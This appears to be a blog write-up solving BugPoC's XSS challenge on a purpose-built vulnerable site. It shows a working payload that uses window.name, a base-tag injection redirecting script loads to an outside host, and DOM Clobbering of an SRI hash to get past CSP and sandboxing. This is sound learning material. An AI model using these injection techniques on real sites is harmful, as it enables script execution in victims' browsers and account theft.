---
layout: post
title:  "BugPoC's XSS Challenge Writeup"
date:   2020-11-09 11:09:00 +0545
author: machinexa
image: /posts/writeups/assets/images/xsschallenge.jpeg
category: Writeups
---

## Description
From the time of the announcement, I was excited about the new challenge from BugPoC. The challenge was to pop alert box with origin as text, bypassing CSP, and sandboxed iframe. Also, the alert must work in the latest version of Chrome only. I started solving immediately after the challenge was released. The challenge URL is:  [wacky.buggywebsite.com](https://wacky.buggywebsite.com/)

### Finding Reflection
So, my first task was to find reflection or DOM XSS sink. Visiting the site, the first thing I noticed was the webpage was only available for Chrome, so I opened it in Chromium. Here's what it looked like: 

![Homepage](/posts/writeups/assets/images/xsschallenge_homepage.png)

I tried writing some text and it was successfully reflected. I immediately tried some tags but nope it didn't work. The regex was replacing `&*<>%` characters with a blank string. The thing to note was that it was reflected as `<iframe src="frame.html?param=Hello, World!" name="iframe">`  

I thought about injecting event handler and attributes like srcdoc but I don't think any will work because popping alert won't be easy, will it?
Besides, I found about frame.html from the reflection so I started to analyze its source code. There were lots of scripts and the one that was important was:
```js
window.fileIntegrity = window.fileIntegrity || {
	'rfc' : ' https://w3c.github.io/webappsec-subresource-integrity/',
	'algorithm' : 'sha256',
	'value' : 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=',
	'creationtime' : 1602687229
}

// verify we are in an iframe
if (window.name == 'iframe') {
	// securely load the frame analytics code
	if (fileIntegrity.value) {
		// create a sandboxed iframe
		analyticsFrame = document.createElement('iframe');
		analyticsFrame.setAttribute('sandbox', 'allow-scripts allow-same-origin');
		analyticsFrame.setAttribute('class', 'invisible');
		document.body.appendChild(analyticsFrame);

		// securely add the analytics code into iframe
		script = document.createElement('script');
		script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
		script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
		script.setAttribute('crossorigin', 'anonymous');
		analyticsFrame.contentDocument.body.appendChild(script);
	}
} else {
	...
}
```
<br>
The first thing I tried was to change the window.name to "iframe" from dev tools, then refresh the page. You might think it's self XSS as user interaction is required but it is not:

![window.name](/posts/writeups/assets/images/xsschallenge_windowname.png)

It is a special global variable because it is persistent across cross-domain. Thus, an attacker can change the variable, and it will be available even after refreshing or visiting a new page. After checking its source, we got 2 reflections and 1 partial reflection. The important was unsanitized input reflected in `<title>` while the rest were either useless or sanitized.

### Bypassing CSP and SRI
After getting unsanitized reflection, I tried to escape from the title then pop alert. I used this payload `</title><script>alert(1)</script>` but unfortunately, the Chrome's great CSP blocked it. Using CSP evaluator from Google, I found out this CSP was faulty. The following message caught my attention:
```
Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker-controlled domain. Can you set it to 'none' or 'self'?
```
<br>
Injecting the `<base>` tag will cause the script to be fetched from an attacker-controlled domain, thus executing arbitrary javascript. If you remember the code above, there is actually a script tag that fetches `frame-analytics.js`. Everything was ready for my plan and I was hoping for an alert but nope. After injection, the only thing I got was another error which got me frustrated.  

![Integrity error](/posts/writeups/assets/images/xsschallenge_sri.png)

It was an integrity error which is related to SRI (Sub Resource Integrity), which protects against compromised script sources. In nutshell, it's a hash of the entire javascript file. There was no way I could generate the same hash, and a collision was impossible as the browser only supports collision resistant hashes. However, if I could change `window.fileIntegrity.value`, maybe I could set the value to the hash of my file.  

The id and value attribute of `<input>` directly affects javascript variables. Its a well known method of DOM Clobbering commonly used in CTFs. So, I used the following script: 
```html
<script>
window.name = "iframe";
payload = encodeURI('</title><base href="https://wzqkyz5l1054.redir.bugpoc.ninja/"><input id="fileIntegrity" value="3ZRbpxB3ZH9LPg3CX6ZGzidaPOFZOSpeK06lI1eZOLE=">');
window.location = "https://wacky.buggywebsite.com/frame.html?param=" + payload; //
</script>
```
And guess what happened? I got another error :rage:

### Magical alert box
Since, allow-modals wasn't set I tried experimenting with different frames and window objects. By default, Chrome blocks call to alert in the sandboxed environment ([Blocked modal dialogs](https://googlechrome.github.io/samples/block-modal-dialogs-sandboxed-iframe/)). Searching for a bypass, I didn't get anything useful, however, it was very easy to bypass, I just needed to alert on the upper frame. For that I used, `window.top.alert()`.  

Finally, the moment I was waited for after trying for so long came. I got the **magical alert box**, it was truly amazing. 

![Magical alert box](/posts/writeups/assets/images/xsschallenge_alert.png)


## Takeaway 

* When going for XSS, search for as much reflection and sink as you can.
* Make sure to always review CSP policies. 
* Never stop learning, you find something new each day. 

The challenge was awesome, and I loved it. I also learned a lot of new things. Also, thanks to:
* BugPoC and Amazon for hosting and sponsoring the challenge.
* LiveOverflow for an awesome window.name trick
* Portswigger for awesome DOM Clobbering article

By the way, if you haven't watched [Liveoverflow's video](https://www.youtube.com/watch?v=L1RvK1443Yw&t=307s), go watch it now.
